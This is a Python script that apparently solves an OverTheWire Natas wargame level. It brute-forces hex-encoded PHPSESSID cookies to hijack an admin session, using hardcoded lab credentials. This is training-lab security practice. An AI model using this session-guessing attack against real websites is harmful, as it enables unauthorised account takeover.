import requests
import binascii
from requests.auth import HTTPBasicAuth

url = 'http://natas19.natas.labs.overthewire.org/index.php'
auth = HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

def get_session_id(id):
    return binascii.hexlify(f'{str(id)}-admin'.encode())

def send_request(id):
    cookie = { 'PHPSESSID': get_session_id(id).decode() } 
    req = requests.post(url, cookies=cookie, auth=auth)
    if 'You are logged in as a regular use' in req.text:
        return False
    else:
        print(req.text)
        return True

for i in range(0, 641):
    print(f'\r{i}', flush=False, end=' ')
    if send_request(i):
        break
